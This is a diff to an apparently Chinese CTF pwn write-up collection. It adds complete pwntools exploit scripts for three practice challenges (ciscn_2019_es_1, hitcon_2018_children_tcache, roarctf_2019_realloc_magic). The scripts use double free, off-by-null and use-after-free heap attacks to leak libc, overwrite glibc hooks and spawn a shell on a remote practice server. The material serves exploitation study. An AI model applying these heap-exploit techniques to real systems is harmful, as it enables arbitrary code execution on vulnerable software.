@@ -1022,5 +1022,223 @@ exp()
 ```  
 ## 0x26  gyctf_2020_force  
 https://n0vice.top/2020/05/09/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-force/index.html  
-## 0x27  
+## 0x27  ciscn_2019_es_1  
+经典double free + tcache attack
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+import sys
+#context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './ciscn_2019_es_1' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",26506)
+elf=ELF(binary)
+#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
+libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+def add(size,name,call):
+    p.recvuntil("choice:")
+    p.sendline("1")
+    p.recvuntil("name")
+    p.sendline(str(size))
+    p.recvuntil("name:")
+    p.send(name)
+    p.recvuntil("call:")
+    p.send(call)
+def show(index):
+    p.recvuntil("choice:")
+    p.sendline("2")
+    p.recvuntil("index:")
+    p.sendline(str(index))
+def free(index):
+    p.recvuntil("choice:")
+    p.sendline("3")
+    p.recvuntil("index:")
+    p.sendline(str(index))
+
+def exp():
+    add(0x4f0,"a","b")
+    add(0x20,"a","b")
+    add(0x40,"/bin/sh","/bin/sh")
+    free(0)
+    show(0)
+    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+    log.success("puts_addr==>" + hex(puts_addr))
+    libc_base = puts_addr - 0x3ebca0
+    log.success("libc_base==>" + hex(libc_base))
+    free_hook = libc_base + libc.sym["__free_hook"]
+    log.success("free_hook==>" + hex(free_hook))
+    system = libc_base + libc.sym['system']
+    log.success("system==>" + hex(system))
+    free(1)
+    free(1)
+    add(0x20,p64(free_hook),"a")
+    add(0x20,"a","b")
+    add(0x20,p64(system),"a")
+    free(2)
+    #gdb.attach(p)
+    
+    p.interactive()
+exp()
+```  
+## 0x28 hitcon_2018_children_tcache  
+off by null + tcache attack  
+```python   
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+import sys
+#context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './HITCON_2018_children_tcache' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",29514)
+elf=ELF(binary)
+libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+def add(size,content):
+    p.recvuntil("choice: ")
+    p.sendline("1")
+    p.recvuntil("Size:")
+    p.sendline(str(size))
+    p.recvuntil("Data:")
+    p.send(content)
+def show(index):
+    p.recvuntil("choice: ")
+    p.sendline("2")
+    p.recvuntil("Index:")
+    p.sendline(str(index))
+def free(index):
+    p.recvuntil("choice: ")
+    p.sendline("3")
+    p.recvuntil("Index:")
+    p.sendline(str(index))
+def exp():
+    add(0x410,"a") # 0
+    add(0x28,"a") # 1
+    add(0x4f0,"a") # 2
+    add(0x28,"a") # 3
+    free(1)
+    free(0)
+    for i in range (0,9):
+        add(0x28-i,'a'*(0x28-i))#0
+        free(0)
+    add(0x28,"a"*0x20+p64(0x450)) # 0
+    free(2)
+    add(0x410,"a") # 1
+    show(0)
+    addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+    libc_base = addr - 0x3ebca0
+    malloc_hook = libc_base + libc.sym['__malloc_hook']
+    free_hook = libc_base + libc.sym['__free_hook']
+    system = libc_base + libc.sym['system']
+    one = libc_base + 0x4f322
+    log.success("libc_base==>" + hex(libc_base))
+    log.success("malloc_hook==>" + hex(malloc_hook))
+    log.success("free_hook==>" + hex(free_hook))
+    log.success("system==>" + hex(system))
+    
+    add(0x28,"b") # 2
+    free(2)
+    free(0)
+    
+    add(0x28,p64(malloc_hook))
+    add(0x28,"a")
+    add(0x28,p64(one))
+    p.interactive()
+exp()
+```  
+## 0x29  roarctf_2019_realloc_magic  
+利用uaf和chunk overlap改fd处的main_arena+96的后1.5字节，剩余0.5字节爆破，使其变成_IO_2_1_stdout_，然后改_IO_2_1_stdout_中的IO_write_base和flags泄露_IO_file_jumps函数地址，最后打free_hook为system  
+exp  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+import sys
+#context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './roarctf_2019_realloc_magic' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",25767)
+elf=ELF(binary)
+libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+def add(size,content):
+    p.recvuntil(">> ")
+    p.sendline("1")
+    p.recvuntil("Size?")
+    p.sendline(str(size))
+    p.recvuntil("Content?")
+    p.send(content)
+def free():
+    p.recvuntil(">> ")
+    p.sendline("2")
+
+def exp():
+    add(0x70,"a")
+    add(0,"")
+    add(0x100,"a")
+    add(0,"")
+    add(0xa0,"a")
+    add(0,"")
+    add(0x100,"b")
+    [free() for i in range(7)]
+    add(0,"")
+    add(0x70,"a")
+    
+    payload = "a"*0x78 + p64(0x41) + '\x60\x17'
+    add(0x180,payload)
+    add(0,"")
+    add(0x100,"a")
+    add(0,"")
+    
+    payload = p64(0xfbad1887)+p64(0)*3+p8(0x58)
+    add(0x100,payload)
+    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+    log.success("puts_addr==>" + hex(puts_addr))
+    libc_base = puts_addr - 0x3e82a0
+    log.success("libc_base==>" + hex(libc_base))
+    system = libc_base + libc.sym['system']
+    log.success("system==>" + hex(system))
+    free_hook = libc_base + libc.sym['__free_hook']
+    log.success("free_hook==>" + hex(free_hook))
+    p.sendline("666")
+    add(0x120,"a")
+    add(0,"")
+    add(0x130,"a")
+    add(0,"")
+    add(0x170,"a")
+    add(0,"")
+    add(0x130,"a")
+    [free() for i in range(7)]
+    add(0,"")
+    add(0x120,"a")
+    payload = "a" * 0x128 + p64(0x41) + p64(free_hook-8)
+    add(0x260,payload)
+    add(0,"")
+    add(0x130,"a")
+    add(0,"")
+    payload = "/bin/sh\x00" + p64(system)
+    add(0x130,payload)
+    free()
+    
+    p.interactive()
+if __name__ == "__main__":
+    while True:
+        p = remote("node3.buuoj.cn", 25767)
+        try:
+            exp()
+        except:
+            p.close()
+```  
+## 0x30  
 咕咕咕……  
